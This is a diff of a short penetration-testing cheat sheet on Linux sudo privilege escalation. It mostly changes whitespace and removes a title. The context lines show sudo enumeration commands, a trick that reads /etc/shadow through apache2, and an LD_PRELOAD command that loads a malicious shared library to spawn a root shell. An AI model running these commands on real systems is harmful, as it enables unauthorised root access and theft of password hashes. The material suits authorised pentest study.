@@ -1,15 +1,19 @@
-                                              ### SUDO Enumeration And Exploit
+                                      
                                               
                                               
                                               
                                               
-   ## Sudo Enumeration 
+ ## Sudo Enumeration 
+ 
+ 
    
                  sudo -l
                  sudo --version
                  sudo apache2 -f /etc/shadow
                  
                  
+		 
+		 
                  
    ### LD_PRELOAD and NOPASSWD
 
@@ -34,3 +38,7 @@ void _init() {
 ```
 
 Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+
+
+
+
